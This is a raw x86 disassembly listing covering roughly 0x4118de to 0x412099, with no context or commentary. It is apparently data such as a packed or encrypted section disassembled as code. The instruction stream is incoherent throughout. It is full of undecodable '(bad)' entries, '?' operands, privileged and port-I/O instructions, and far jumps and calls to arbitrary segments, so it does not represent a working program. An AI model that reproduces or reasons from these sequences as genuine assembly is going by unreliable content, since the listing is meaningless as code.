  4118de:	clc    
  4118df:	pop    esi
  4118e0:	adc    DWORD PTR [esp+esi*1],0x3a
  4118e4:	sbb    al,0x1d
  4118e6:	cmp    esi,eax
  4118e8:	es ret 0xb858
  4118ec:	adc    DWORD PTR [edi+0x77],ebx
  4118ef:	inc    edx
  4118f0:	push   esi
  4118f1:	aam    0x1f
  4118f3:	xchg   ecx,eax
  4118f4:	jge    0x4118b7
  4118f6:	or     al,0xec
  4118f8:	rcr    BYTE PTR [ecx-0x2b],cl
  4118fb:	dec    esp
  4118fc:	(bad)  
  4118fd:	out    0xa4,al
  4118ff:	mov    DWORD PTR ds:0x2733ee50,edx
  411905:	stos   BYTE PTR es:[edi],al
  411906:	jne    0x411971
  411908:	cwde   
  411909:	inc    esi
  41190a:	aam    0x25
  41190c:	(bad)  
  41190d:	jns    0x4118e1
  41190f:	and    DWORD PTR [esi],ebp
  411911:	loope  0x411943
  411913:	cdq    
  411914:	xchg   ecx,eax
  411915:	inc    ebx
  411916:	or     DWORD PTR [esp+edx*2-0x6c],ebp
  41191a:	xor    edi,0x822ea41d
  411920:	xchg   edi,eax
  411921:	nop
  411922:	adc    eax,0xf0c246b8
  411927:	adc    BYTE PTR [edi+eiz*2],0x75
  41192b:	add    ah,ah
  41192d:	(bad)  
  41192e:	dec    esp
  41192f:	inc    ecx
  411930:	aam    0xc3
  411932:	adc    edx,ebp
  411934:	push   es
  411935:	inc    edx
  411936:	sub    DWORD PTR gs:[ebp+0x2],edx
  41193a:	xor    BYTE PTR [ebx+0x5e],0xd6
  41193e:	jno    0x411904
  411940:	mov    ch,0xac
  411942:	add    eax,0xda46c6fd
  411947:	leave  
  411948:	iret   
  411949:	adc    al,0xd9
  41194b:	aaa    
  41194c:	push   0x6a
  41194e:	mov    ebx,0xa93016f0
  411953:	gs cmp bh,bh
  411956:	ds mov edi,0xaad46540
  41195c:	cwde   
  41195d:	jge    0x4119c9
  41195f:	push   0x75
  411961:	cmp    BYTE PTR [esi+0x35],cl
  411964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411965:	mov    ?,WORD PTR [ebx+ecx*4]
  411968:	dec    ebx
  411969:	xor    eax,0x65071625
  41196e:	adc    bl,BYTE PTR [eax-0xe]
  411971:	aam    0xc
  411973:	dec    esp
  411974:	adc    esp,ebp
  411976:	gs jmp 0xf616:0x18cc06ce
  41197e:	sahf   
  41197f:	jmp    0x1e17:0x9b9e43bc
  411986:	xchg   ebx,eax
  411987:	sbb    eax,0x8a7fd626
  41198c:	sar    DWORD PTR [esi-0xed608be],1
  411992:	daa    
  411993:	pop    eax
  411994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411995:	pop    ebp
  411996:	loopne 0x4119af
  411998:	mov    eax,0xb284093c
  41199e:	mov    eax,0x28319d89
  4119a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119a4:	outs   dx,BYTE PTR ds:[esi]
  4119a5:	rol    edi,cl
  4119a7:	xor    al,0x7e
  4119a9:	(bad)  
  4119ab:	rol    DWORD PTR [esp+eiz*4+0x2b],1
  4119af:	add    BYTE PTR [ebp+0x4e26ca8d],dl
  4119b5:	add    dl,0x5f
  4119b8:	push   ecx
  4119b9:	in     eax,0xb7
  4119bb:	sub    eax,0x3b638d62
  4119c0:	out    0x61,al
  4119c2:	mov    ch,BYTE PTR [edx-0x293d0e77]
  4119c8:	push   0x8b053886
  4119cd:	jb     0x411981
  4119cf:	sbb    bl,BYTE PTR [esp+esi*8+0x5cfe5d45]
  4119d6:	retf   
  4119d7:	mov    ebx,0xb33bd155
  4119dc:	pop    edi
  4119dd:	arpl   WORD PTR [ebx],di
  4119df:	mov    edx,0xbda2bebb
  4119e4:	fst    QWORD PTR [edi]
  4119e6:	mul    bl
  4119e8:	sub    edx,eax
  4119ea:	addr16 mov esp,0xdcbdbc61
  4119f0:	pop    ds
  4119f1:	shr    DWORD PTR [edx-0x3f],1
  4119f4:	cmp    ebx,DWORD PTR [ebx-0x16ed84f]
  4119fa:	xor    BYTE PTR [edx+esi*8+0x69],ah
  4119fe:	into   
  4119ff:	sub    ebp,DWORD PTR [ecx+ecx*2+0x63]
  411a03:	cmp    BYTE PTR ds:0x270e786e,0x75
  411a0a:	adc    al,0xc7
  411a0c:	jb     0x4119ca
  411a0e:	push   edx
  411a0f:	ficom  WORD PTR [esi+0x5c]
  411a12:	adc    DWORD PTR [esi+0x46],0x75
  411a16:	jbe    0x411a1b
  411a18:	xor    eax,0xbd353409
  411a1d:	(bad)  [edi-0x5e]
  411a20:	sub    dl,BYTE PTR [edi+eiz*4]
  411a23:	jmp    0xc8e52816
  411a28:	retf   
  411a29:	sub    DWORD PTR [ecx-0x24],ecx
  411a2c:	jmp    0xc365:0xc672eb6d
  411a33:	jl     0x4119d1
  411a35:	popa   
  411a36:	or     dl,BYTE PTR ss:[edx+0x7078983a]
  411a3d:	or     al,0x57
  411a3f:	inc    eax
  411a40:	daa    
  411a41:	sub    edx,edx
  411a43:	push   ecx
  411a44:	jecxz  0x411a92
  411a46:	xor    DWORD PTR [ebp+0x1ee0fbf0],esp
  411a4c:	xor    al,BYTE PTR [ecx+0x1719b5aa]
  411a52:	pop    ss
  411a53:	popf   
  411a54:	leave  
  411a55:	pusha  
  411a56:	and    esp,eax
  411a58:	fst    DWORD PTR [ecx+edx*2+0x780fba50]
  411a5f:	sbb    edx,DWORD PTR [eax+0x867b5d6]
  411a65:	or     eax,0xaaead8c8
  411a6a:	adc    BYTE PTR [ebx+0x57178554],cl
  411a70:	fs out dx,al
  411a72:	or     eax,0x194a1e91
  411a77:	call   0xfc17fef1
  411a7c:	mov    ch,0x87
  411a7e:	test   eax,0x519840a
  411a83:	enter  0xabd8,0x1f
  411a87:	mov    ebp,0x7cd27948
  411a8c:	sub    DWORD PTR [eax],ebp
  411a8e:	mov    ah,0x38
  411a90:	xchg   edi,eax
  411a91:	les    edi,FWORD PTR [eax]
  411a93:	xor    DWORD PTR ds:0x7067fb3e,eax
  411a99:	adc    DWORD PTR [esi-0x63],ecx
  411a9c:	out    dx,eax
  411a9d:	dec    edx
  411a9e:	adc    DWORD PTR [ebx-0x22182701],0x32a0ec0f
  411aa8:	scas   eax,DWORD PTR es:[edi]
  411aa9:	adc    DWORD PTR [esi-0x67],ebx
  411aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aad:	test   BYTE PTR ss:[ebx-0x3e518788],al
  411ab4:	shl    DWORD PTR [edi-0x17],cl
  411ab7:	mov    dl,0x7d
  411ab9:	sti    
  411aba:	cld    
  411abb:	adc    al,0x8d
  411abd:	sahf   
  411abe:	jl     0x411b39
  411ac0:	push   ss
  411ac1:	out    dx,eax
  411ac2:	fst    QWORD PTR [ebx+0x2d797dde]
  411ac8:	hlt    
  411ac9:	out    0x50,al
  411acb:	and    ah,dh
  411acd:	sti    
  411ace:	mov    sp,sp
  411ad1:	xchg   edx,eax
  411ad2:	or     eax,edx
  411ad4:	popf   
  411ad5:	lock pop edi
  411ad7:	inc    eax
  411ad8:	test   DWORD PTR [esi],0x88b7ccad
  411ade:	stos   DWORD PTR es:[edi],eax
  411adf:	rol    ah,cl
  411ae1:	or     DWORD PTR [bp+0x61ec],ebp
  411ae6:	mov    al,0xf1
  411ae8:	push   esp
  411ae9:	outs   dx,DWORD PTR ds:[esi]
  411aea:	das    
  411aeb:	jo     0x411ae2
  411aed:	lods   eax,DWORD PTR ds:[esi]
  411aee:	adc    DWORD PTR [eax+eax*4],0x8cc42822
  411af5:	data16 int3 
  411af7:	scas   eax,DWORD PTR es:[edi]
  411af8:	xchg   esi,eax
  411af9:	in     al,dx
  411afa:	aad    0xf5
  411afc:	sbb    DWORD PTR [eax],0x4f
  411aff:	mov    ds:0xe900dbdd,al
  411b04:	dec    esp
  411b05:	je     0x411aff
  411b07:	outs   dx,DWORD PTR ds:[esi]
  411b08:	aad    0x79
  411b0a:	mov    BYTE PTR [ebx+0x47],al
  411b0d:	call   DWORD PTR [ebx-0x27c01f2d]
  411b13:	hlt    
  411b14:	nop    DWORD PTR [edi+0x57]
  411b18:	cmc    
  411b19:	fwait
  411b1a:	xor    BYTE PTR [edi+0x3f],al
  411b1d:	jmp    0x411aaa
  411b1f:	fwait
  411b20:	into   
  411b21:	scas   al,BYTE PTR es:[edi]
  411b22:	aam    0xc6
  411b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b25:	jae    0x411adf
  411b27:	ror    DWORD PTR [esi+edx*4+0x6c],cl
  411b2b:	dec    ebp
  411b2c:	jl     0x411b6e
  411b2e:	inc    eax
  411b2f:	and    edx,DWORD PTR ds:0xbb1783dc
  411b35:	or     DWORD PTR [edi-0x4d],eax
  411b38:	rcl    DWORD PTR [edx],1
  411b3a:	or     al,0x1a
  411b3c:	(bad)  
  411b3d:	dec    ebx
  411b3e:	hlt    
  411b3f:	rcl    DWORD PTR [edi+0x6],1
  411b42:	inc    DWORD PTR [edx-0x1]
  411b45:	out    0x23,eax
  411b47:	mov    es,WORD PTR [edx]
  411b49:	leave  
  411b4a:	sbb    bl,0x55
  411b4d:	ds out dx,eax
  411b4f:	adc    eax,DWORD PTR [esi-0x6c024530]
  411b55:	cmp    al,0xc8
  411b57:	pushw  cs
  411b59:	adc    edi,ebx
  411b5b:	enter  0x59ef,0x55
  411b5f:	cmp    bh,BYTE PTR [ebx+0x4b392410]
  411b65:	out    0x2c,al
  411b67:	push   0x5b
  411b69:	jmp    0xc4320963
  411b6e:	bswap  ecx
  411b70:	retf   0xbd2f
  411b73:	dec    edx
  411b74:	jae    0x411af9
  411b76:	xchg   edx,eax
  411b77:	add    bl,BYTE PTR ds:0x3b62
  411b7c:	mov    ecx,0x2313042c
  411b81:	sbb    DWORD PTR [esi+0x5aea3871],ecx
  411b87:	cdq    
  411b88:	ret    0xe21b
  411b8b:	add    ah,BYTE PTR [ebx]
  411b8d:	add    al,0x9d
  411b8f:	xor    dl,cl
  411b91:	ja     0x411b65
  411b93:	nop
  411b94:	mov    al,0xc7
  411b96:	or     BYTE PTR [esi+0x411124d1],ch
  411b9c:	adc    DWORD PTR [edx+0x5ff46011],ebx
  411ba2:	fild   WORD PTR [esi-0x5f]
  411ba5:	shr    BYTE PTR [eax],1
  411ba7:	jp     0x411c0f
  411ba9:	xor    DWORD PTR [edx+0x1e],eax
  411bac:	fwait
  411bad:	lock mov ecx,0x21aae8bb
  411bb3:	in     eax,0xa9
  411bb5:	push   ecx
  411bb6:	mov    cl,0x39
  411bb8:	stos   DWORD PTR es:[edi],eax
  411bb9:	pop    eax
  411bba:	sar    DWORD PTR [esi+0x60da3b93],1
  411bc0:	cmp    BYTE PTR [esi],ah
  411bc2:	in     eax,dx
  411bc3:	mov    edi,0x759a4c24
  411bc8:	adc    al,0x54
  411bca:	addr16 jmp 0x411bbf
  411bcd:	or     cl,dl
  411bcf:	inc    esp
  411bd0:	addr16 mov dh,0x7e
  411bd3:	lahf   
  411bd4:	mov    dl,0x14
  411bd6:	loope  0x411bca
  411bd8:	jb     0x411c23
  411bda:	ja     0x411bae
  411bdc:	rcr    bh,1
  411bde:	mov    ch,0xf5
  411be0:	xor    DWORD PTR [ebx-0x723490ef],edi
  411be6:	mov    dl,0x90
  411be8:	and    bl,BYTE PTR [ebp-0x48]
  411beb:	jae    0x411c50
  411bed:	inc    ecx
  411bee:	mov    ah,0x28
  411bf0:	scas   eax,DWORD PTR es:[edi]
  411bf1:	(bad)  
  411bf2:	mov    cs,ebx
  411bf4:	cs (bad) 
  411bf6:	adc    ebx,0x51
  411bf9:	(bad)  
  411bfb:	cli    
  411bfc:	out    dx,al
  411bfd:	sub    DWORD PTR [edx+0x16],edx
  411c00:	lock adc al,0x5c
  411c03:	addr16 in eax,dx
  411c05:	mov    ah,0xf6
  411c07:	mov    edi,0x3a52b3dc
  411c0c:	sbb    al,0x99
  411c0e:	test   DWORD PTR [ecx-0x6a91194f],ebx
  411c14:	mov    edx,0xd7e66c2c
  411c19:	jbe    0x411bbe
  411c1b:	in     al,0x8f
  411c1d:	pop    edx
  411c1e:	mov    ecx,0x220fe7cb
  411c23:	leave  
  411c24:	in     al,dx
  411c25:	int    0x93
  411c27:	arpl   WORD PTR ds:0x55d8b649,dx
  411c2d:	push   ss
  411c2e:	xor    al,0x4b
  411c30:	or     eax,0xc2f2ece0
  411c35:	jb     0x411c95
  411c37:	mov    DWORD PTR [edi],eax
  411c39:	push   edx
  411c3a:	scas   al,BYTE PTR es:[edi]
  411c3b:	es xchg edx,eax
  411c3d:	lods   al,BYTE PTR ds:[esi]
  411c3e:	ja     0x411be0
  411c40:	dec    edx
  411c41:	xchg   esi,eax
  411c42:	push   cs
  411c43:	jmp    0x411c47
  411c45:	popf   
  411c46:	adc    DWORD PTR [esi+ecx*2-0x274ab002],esp
  411c4d:	fxch   st(5)
  411c4f:	cmp    eax,0x880312d3
  411c54:	cmp    eax,0xa8b1d438
  411c59:	xchg   edi,ebx
  411c5b:	ins    DWORD PTR es:[edi],dx
  411c5c:	pusha  
  411c5d:	arpl   bx,sp
  411c5f:	lock mov bh,0xe3
  411c62:	mov    dh,bl
  411c64:	nop
  411c65:	mov    WORD PTR [ebx+0x2e6f8994],ss
  411c6b:	xor    eax,0x439812c
  411c70:	lods   eax,DWORD PTR ds:[esi]
  411c71:	call   0x1911:0xde132224
  411c78:	push   es
  411c79:	gs aaa 
  411c7b:	std    
  411c7c:	sub    al,0xd0
  411c7e:	pop    esp
  411c7f:	inc    ebx
  411c80:	mov    eax,ds:0x39f169a
  411c85:	mov    esp,0xab6c4a6c
  411c8a:	cmp    DWORD PTR [ebp+0x6b],0x250183f5
  411c91:	adc    DWORD PTR [ebp-0x6e],edi
  411c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c95:	dec    edi
  411c96:	aad    0x3b
  411c98:	mov    bl,0xb7
  411c9a:	adc    al,0x52
  411c9c:	shr    ebp,1
  411c9e:	stos   DWORD PTR es:[edi],eax
  411c9f:	clts   
  411ca1:	jg     0x411c4c
  411ca3:	sub    al,bh
  411ca5:	popf   
  411ca6:	dec    ecx
  411ca7:	ficom  WORD PTR [esi]
  411ca9:	mov    ch,0x52
  411cab:	das    
  411cac:	fist   DWORD PTR [eax]
  411cae:	inc    esi
  411caf:	jbe    0x411d08
  411cb1:	ss arpl bp,sp
  411cb4:	sub    ebp,esp
  411cb6:	(bad)  
  411cb7:	xchg   ecx,eax
  411cb8:	mov    BYTE PTR [edi-0x51],bh
  411cbb:	loopne 0x411c65
  411cbd:	pop    ebp
  411cbe:	jns    0x411c7a
  411cc0:	ret    0x7fc1
  411cc3:	add    DWORD PTR [eax],eax
  411cc5:	jns    0x411d34
  411cc7:	fsub   st(3),st
  411cc9:	add    ch,BYTE PTR [edx+0x2db636eb]
  411ccf:	jmp    0x411d09
  411cd1:	repz cli 
  411cd3:	push   es
  411cd4:	inc    esp
  411cd5:	jle    0x411c5b
  411cd7:	add    bh,BYTE PTR [edx-0x3f9f9c45]
  411cdd:	mov    ecx,0xae5683e3
  411ce2:	mov    dl,0x47
  411ce4:	scas   al,BYTE PTR es:[edi]
  411ce5:	inc    ebx
  411ce6:	push   0xba19cd80
  411ceb:	inc    ebx
  411ced:	fimul  DWORD PTR [edi-0x73]
  411cf0:	test   DWORD PTR [ebp+0x35],esp
  411cf3:	lods   eax,DWORD PTR ds:[esi]
  411cf4:	xor    al,0xad
  411cf6:	mov    bh,0xb5
  411cf8:	in     eax,0xcc
  411cfa:	xor    eax,0x17cb7659
  411cff:	loop   0x411cde
  411d01:	mov    ds:0xf660eb3a,eax
  411d06:	or     edi,DWORD PTR [edx]
  411d08:	pop    esi
  411d09:	push   esi
  411d0a:	add    eax,0x8ebd8808
  411d0f:	setae  BYTE PTR [ecx-0x6bd3d17a]
  411d16:	fmul   QWORD PTR [ebp-0x4dfdaa38]
  411d1c:	fstp   DWORD PTR [esi]
  411d1e:	aam    0x6a
  411d20:	add    BYTE PTR [ecx+edi*2],cl
  411d23:	cmp    BYTE PTR [ebp+0x35fcfd0e],bh
  411d29:	mov    bh,0x10
  411d2b:	push   ss
  411d2c:	lds    ebx,FWORD PTR [esi-0x59cb71a1]
  411d32:	sub    cl,BYTE PTR [ecx]
  411d34:	scas   al,BYTE PTR es:[edi]
  411d35:	mov    ebp,0x2c31a6cd
  411d3a:	lods   al,BYTE PTR ds:[esi]
  411d3b:	and    ah,BYTE PTR [esi]
  411d3d:	aam    0x9b
  411d3f:	and    DWORD PTR [esi],edi
  411d41:	mov    dl,0x96
  411d43:	add    BYTE PTR fs:[ebx+0x6a59be68],dh
  411d4a:	mov    eax,ss:0xc6bcc4ba
  411d50:	jno    0x411ce8
  411d52:	pop    ds
  411d53:	aaa    
  411d54:	sar    DWORD PTR [eax],1
  411d56:	repz inc esi
  411d58:	push   edi
  411d59:	rdtsc  
  411d5b:	dec    esi
  411d5c:	or     al,0xb3
  411d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d60:	adc    eax,0xb83c0cd8
  411d65:	fwait
  411d66:	enter  0x8f6e,0x40
  411d6a:	pop    ebp
  411d6b:	ds push edx
  411d6d:	out    dx,al
  411d6e:	jle    0x411d97
  411d70:	sub    al,0xc1
  411d72:	push   ebx
  411d73:	push   eax
  411d74:	test   DWORD PTR [ebx+0x6b],edx
  411d77:	test   eax,0xa57e960d
  411d7c:	(bad)  
  411d7d:	dec    eax
  411d7e:	iret   
  411d7f:	addr16 xchg ecx,eax
  411d81:	shr    BYTE PTR [esi+ecx*1],1
  411d84:	mov    ah,BYTE PTR [ecx+0x3e3f974a]
  411d8a:	test   DWORD PTR [eax],esp
  411d8c:	mov    dh,0x94
  411d8e:	push   eax
  411d8f:	imul   eax,DWORD PTR [edx+0x76],0xffffff9a
  411d93:	jbe    0x411dfe
  411d95:	ins    BYTE PTR es:[edi],dx
  411d96:	(bad)  
  411d97:	inc    ecx
  411d98:	imul   eax,DWORD PTR [ecx-0xa],0x436d1e34
  411d9f:	mov    ebp,ecx
  411da1:	adc    al,0xa7
  411da3:	xor    BYTE PTR [edi+0x11],ch
  411da6:	xchg   ebp,eax
  411da7:	(bad)  
  411da8:	xchg   esp,eax
  411da9:	jl     0x411d8e
  411dab:	xchg   esi,eax
  411dac:	inc    edi
  411dad:	add    eax,0xee08096f
  411db2:	stos   DWORD PTR es:[edi],eax
  411db3:	loop   0x411e33
  411db5:	mov    eax,0x4dffe67f
  411dba:	xchg   ebp,eax
  411dbb:	fmul   st(0),st
  411dbd:	stc    
  411dbe:	xchg   esp,eax
  411dbf:	adc    al,0xfc
  411dc1:	sti    
  411dc2:	xchg   ecx,eax
  411dc3:	dec    edi
  411dc4:	sbb    al,0x4e
  411dc6:	les    esp,FWORD PTR [edx]
  411dc8:	addr16 test al,0xa3
  411dcb:	cdq    
  411dcc:	or     BYTE PTR [ebx-0x68adef56],0x6d
  411dd3:	sbb    edx,ebx
  411dd5:	and    BYTE PTR [edi+0x42d7fc8d],al
  411ddb:	adc    BYTE PTR [eax-0x5abf2d15],dl
  411de1:	data16 test al,0x1d
  411de4:	out    0x5,al
  411de6:	mov    dl,0x95
  411de8:	and    al,ch
  411dea:	stos   DWORD PTR es:[edi],eax
  411deb:	out    0xf8,eax
  411ded:	or     al,0xf4
  411def:	xchg   esp,eax
  411df0:	xor    DWORD PTR [ebp+edx*1+0x6f],ebp
  411df4:	dec    esi
  411df5:	lods   al,BYTE PTR ds:[esi]
  411df6:	push   cs
  411df7:	fadd   QWORD PTR gs:[esi]
  411dfa:	xor    DWORD PTR [esi+0x1c],edx
  411dfd:	sub    ch,bl
  411dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e00:	mov    WORD PTR [esi-0x365d7995],gs
  411e06:	and    eax,0x1dba106a
  411e0b:	outs   dx,BYTE PTR ds:[esi]
  411e0c:	inc    esi
  411e0d:	(bad)  
  411e0f:	or     DWORD PTR [edi-0x1f68da00],0xb36e3886
  411e19:	loope  0x411e63
  411e1b:	jbe    0x411ddc
  411e1d:	xor    ebx,DWORD PTR [eax-0x6]
  411e20:	(bad)  
  411e21:	(bad)  
  411e22:	mov    dl,0xaa
  411e24:	adc    DWORD PTR [ebp-0x740beee],eax
  411e2a:	mov    ebp,0x9d52da4b
  411e2f:	daa    
  411e30:	push   eax
  411e31:	jnp    0x411ded
  411e33:	adc    bh,BYTE PTR [edi]
  411e35:	jb     0x411e4b
  411e37:	or     ecx,DWORD PTR [eax+0x5f29e766]
  411e3d:	xchg   DWORD PTR [esp+eax*8-0x4a],esi
  411e41:	xchg   ecx,eax
  411e42:	inc    ebp
  411e43:	stc    
  411e44:	mov    edx,0xd2dcea7e
  411e49:	xchg   esi,eax
  411e4a:	test   DWORD PTR [esi],eax
  411e4c:	js     0x411df9
  411e4e:	and    al,0xd3
  411e50:	push   DWORD PTR [edi-0x18]
  411e53:	jae    0x411e7d
  411e55:	xor    BYTE PTR [eax+0x63],ch
  411e58:	(bad)  
  411e59:	push   ebx
  411e5a:	scas   eax,DWORD PTR es:[edi]
  411e5b:	dec    eax
  411e5c:	mov    al,0x63
  411e5e:	ins    BYTE PTR es:[edi],dx
  411e5f:	xchg   esi,eax
  411e60:	dec    ebp
  411e61:	ret    
  411e62:	enter  0x87b1,0x3e
  411e66:	enter  0x1256,0x28
  411e6a:	mov    WORD PTR [ebp-0x774fa83e],es
  411e70:	shl    esp,0x35
  411e73:	arpl   WORD PTR [ebp+0x6f],dx
  411e76:	pop    es
  411e77:	inc    ecx
  411e78:	test   esi,eax
  411e7a:	dec    ebx
  411e7b:	iret   
  411e7c:	jmp    0xf048:0x675a4031
  411e83:	or     ah,BYTE PTR [esi-0x6]
  411e86:	pop    edi
  411e87:	lock push eax
  411e89:	or     eax,0x84161852
  411e8e:	mov    ah,0x59
  411e90:	jae    0x411e15
  411e92:	or     edi,DWORD PTR [ebx]
  411e94:	pop    esi
  411e95:	xor    DWORD PTR [esi],0x1a
  411e98:	xchg   edi,eax
  411e99:	mov    DWORD PTR [ecx-0x5f],eax
  411e9c:	mov    DWORD PTR [ebp+0x7e],esp
  411e9f:	mov    ah,BYTE PTR [eax+0x16]
  411ea2:	pop    esi
  411ea3:	cmp    DWORD PTR [ecx-0x6a88258e],ebx
  411ea9:	outs   dx,DWORD PTR ds:[esi]
  411eab:	popa   
  411eac:	sub    eax,0x9b7c179
  411eb1:	or     ch,BYTE PTR [esp+ebp*4+0x13]
  411eb5:	and    DWORD PTR [esi],eax
  411eb7:	mov    ebp,0x4071e10e
  411ebc:	(bad)  
  411ebe:	in     eax,0x71
  411ec0:	stos   DWORD PTR es:[edi],eax
  411ec1:	cwde   
  411ec2:	mov    ch,0x2a
  411ec4:	shufps xmm3,XMMWORD PTR [edx-0xf],0xb
  411ec9:	out    dx,eax
  411eca:	sti    
  411ecb:	pop    ebx
  411ecc:	cmp    ecx,DWORD PTR [esi]
  411ece:	cmp    al,0xfe
  411ed0:	retf   
  411ed1:	leave  
  411ed2:	repnz scas eax,DWORD PTR es:[edi]
  411ed4:	push   esp
  411ed5:	xchg   ebx,eax
  411ed6:	adc    al,0x46
  411ed8:	rcr    BYTE PTR [ebp+eax*1+0x50],0x36
  411edd:	imul   eax,DWORD PTR [edx-0x403817ae],0x78
  411ee4:	dec    edx
  411ee5:	sub    BYTE PTR [ecx],dh
  411ee7:	push   ebx
  411ee8:	(bad)  
  411ee9:	into   
  411eea:	xlat   BYTE PTR ds:[ebx]
  411eeb:	pop    ebx
  411eec:	adc    ebp,DWORD PTR [eax-0x17]
  411eef:	dec    ebp
  411ef0:	push   esi
  411ef1:	adc    BYTE PTR [edi+0x68],0xce
  411ef5:	sbb    ebp,DWORD PTR [ebx]
  411ef7:	stc    
  411ef8:	xchg   BYTE PTR [edx+0x37],dl
  411efb:	sti    
  411efc:	das    
  411efd:	xor    BYTE PTR [esi+0x71d6a7e7],bh
  411f03:	mov    WORD PTR [ecx],gs
  411f05:	jbe    0x411eb2
  411f07:	jmp    0x32b3:0xe3c22742
  411f0e:	cli    
  411f0f:	mov    esi,0x6ba41df1
  411f14:	mov    esp,0xb4b16c66
  411f19:	cmp    eax,0x949bdbca
  411f1e:	fidiv  WORD PTR [ebp-0x75]
  411f21:	shl    DWORD PTR [ebx+0x35547e68],0x94
  411f28:	iret   
  411f29:	jnp    0x411ed5
  411f2b:	mov    edi,0xf9eeb887
  411f30:	(bad)
  411f35:	or     DWORD PTR ds:0xe1b030e2,edi
  411f3b:	jae    0x411f49
  411f3d:	out    0xf6,al
  411f3f:	sbb    DWORD PTR [eax],0x63
  411f42:	sub    eax,0x417de5e1
  411f47:	cmp    ch,bh
  411f49:	shl    DWORD PTR [ebx-0x6b],0xa4
  411f4d:	rcr    ebx,1
  411f4f:	mov    ch,0xa1
  411f51:	mov    ds:0xe823b898,eax
  411f56:	mov    ebp,0x18bd113b
  411f5b:	jne    0x411f10
  411f5d:	mov    bl,BYTE PTR [ebx-0x140ed3ec]
  411f63:	lahf   
  411f64:	jns    0x411f6d
  411f66:	or     DWORD PTR gs:[esi+0x2215fd4d],esi
  411f6d:	(bad)  
  411f6e:	rcr    DWORD PTR [ebx-0x71],1
  411f71:	mov    al,0x6a
  411f73:	lods   al,BYTE PTR ds:[esi]
  411f74:	scas   eax,DWORD PTR es:[edi]
  411f75:	jnp    0x411f2e
  411f77:	test   DWORD PTR [ebx+0x43fbc5b1],0xed027814
  411f81:	mov    eax,ds:0x4e9e1cc6
  411f86:	mov    ah,0x5c
  411f88:	xchg   esp,eax
  411f89:	aad    0x22
  411f8b:	adc    BYTE PTR [ecx+ebx*1-0x76aa427f],bl
  411f92:	adc    al,0x29
  411f94:	mov    dh,0xad
  411f96:	mov    dh,0x29
  411f98:	fild   QWORD PTR [edi+0x9]
  411f9b:	push   ebx
  411f9c:	inc    DWORD PTR [esi+0x2d4a5d6d]
  411fa2:	out    0xac,eax
  411fa4:	lea    esi,[ebx-0x2c]
  411fa7:	add    DWORD PTR [ecx],esp
  411fa9:	add    eax,0x8796552e
  411fae:	outs   dx,DWORD PTR ds:[esi]
  411faf:	adc    edx,DWORD PTR [eax]
  411fb1:	in     eax,0x50
  411fb3:	cmp    eax,DWORD PTR [edi+0x4a]
  411fb6:	and    al,0xc2
  411fb8:	jae    0x412009
  411fba:	rcl    esp,cl
  411fbc:	jne    0x411fd8
  411fbe:	jmp    0x7a36:0x10a258ae
  411fc5:	dec    ebp
  411fc6:	fst    DWORD PTR [ecx-0x25a8ca49]
  411fcc:	cmp    al,0xfb
  411fce:	lods   al,BYTE PTR ds:[esi]
  411fcf:	xchg   ebx,eax
  411fd0:	or     eax,0x2f5cabbc
  411fd5:	cli    
  411fd6:	pop    edx
  411fd7:	pusha  
  411fd8:	push   edx
  411fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fda:	adc    BYTE PTR [ebp+0x19],dh
  411fdd:	cli    
  411fde:	clc    
  411fdf:	call   0xabf6:0x5a82e58
  411fe6:	aad    0xf9
  411fe8:	mov    dh,0x76
  411fea:	fisttp WORD PTR [ebp-0x73714a7f]
  411ff0:	lahf   
  411ff1:	sbb    al,0x73
  411ff3:	xchg   DWORD PTR [eax-0x75],esp
  411ff6:	mov    DWORD PTR [eax-0x1a],ebx
  411ff9:	mov    WORD PTR [esi-0x6d4f7299],?
  411fff:	in     eax,dx
  412000:	aam    0xc
  412002:	fdiv   DWORD PTR [esi+0x61]
  412005:	xor    DWORD PTR [ecx+0x65],ebp
  412008:	bound  ebp,QWORD PTR [edi]
  41200a:	in     al,0xad
  41200c:	imul   esp,DWORD PTR [ebp+ebx*1-0x2847502f],0xdb0fbaf5
  412017:	lahf   
  412018:	dec    edx
  412019:	dec    edx
  41201a:	inc    eax
  41201b:	or     DWORD PTR gs:[ecx-0x7d998721],0x740df188
  412026:	push   cs
  412027:	out    0x1d,eax
  412029:	outs   dx,BYTE PTR ds:[esi]
  41202a:	xchg   ebp,eax
  41202b:	out    0x26,al
  41202d:	jmp    0x41204d
  41202f:	xor    cl,BYTE PTR [esi-0x21c48a7f]
  412035:	inc    ebx
  412036:	and    DWORD PTR [edi+0x5310422b],ecx
  41203c:	cwde   
  41203d:	ins    DWORD PTR es:[edi],dx
  41203e:	test   DWORD PTR [ebp-0x52],edx
  412041:	cdq    
  412042:	mov    bl,0x12
  412044:	les    esp,FWORD PTR es:[eax]
  412047:	lahf   
  412048:	rcr    BYTE PTR [eax+0x73b81d17],cl
  41204e:	cwde   
  41204f:	sub    esp,DWORD PTR [ecx]
  412051:	fist   WORD PTR [ecx+0x1]
  412054:	icebp  
  412055:	and    ah,BYTE PTR [eax+0x36]
  412058:	and    eax,0xf672aa25
  41205d:	fs fwait
  41205f:	inc    edx
  412060:	dec    edi
  412061:	rol    DWORD PTR [ebx+ebp*1+0x36af0a46],0x11
  412069:	rcr    eax,0x24
  41206c:	inc    ecx
  41206d:	out    0xde,eax
  41206f:	aad    0x89
  412071:	cmp    ebx,esi
  412073:	test   al,0x75
  412075:	pop    esi
  412076:	lahf   
  412077:	inc    edi
  412078:	jb     0x4120b2
  41207a:	ds push ss
  41207c:	in     al,dx
  41207d:	push   0xffffffcc
  41207f:	int3   
  412080:	test   eax,0x53c8c6d3
  412085:	call   0x3edebef5
  41208a:	xor    dh,BYTE PTR [edi+edi*2-0x6e]
  41208e:	xchg   esp,eax
  41208f:	jle    0x412060
  412091:	sbb    eax,0x65441d26
  412096:	adc    al,0x64
  412098:	pop    ebp
  412099:	cmp    DWORD PTR [ecx-0x10],esp
